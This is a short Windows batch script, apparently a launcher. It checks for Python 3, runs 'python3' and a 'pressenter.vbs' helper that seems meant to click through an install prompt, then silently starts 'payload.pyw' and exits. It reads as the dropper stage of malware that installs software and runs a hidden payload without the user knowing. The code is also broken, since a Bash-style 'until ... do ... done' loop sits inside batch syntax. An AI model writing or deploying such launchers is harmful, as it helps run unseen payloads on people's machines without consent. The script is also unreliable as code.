@echo off
FOR /F "tokens=*" %%g IN ('python --version') do (SET string=%%g)
set "versionn=Python 3"
echo %string%
Echo.%string% | findstr /C:%versionn%>nul && (echo yes) || (python3 & timeout /t 5 /nobreak & start pressenter.vbs)
until [[ $string != *"Python 3"* ]]
do
    timeout /t 1 /nobreak
done
start payload.pyw
exit